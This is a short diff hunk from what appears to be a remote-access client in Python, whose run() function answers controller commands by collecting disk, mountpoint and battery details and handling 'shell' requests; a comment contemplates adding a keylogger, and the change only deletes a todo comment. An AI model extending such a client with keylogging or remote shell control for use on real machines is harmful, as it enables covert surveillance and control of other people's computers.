@@ -69,7 +69,6 @@ def run(): #todo add keylogger?
                         response[p.device] += f', mountpoint: {p.mountpoint}, file system type: {p.fstype}'
                     response['battery'] = psutil.sensors_battery()
                     response = 0, response
-                    #response[''] #todo add more to computer info?
                 elif cmd['type'] == 'shell':
                     if cmd['cmd'] == 'get_loc':
                         response = 0, {'loc': os.getcwd()}
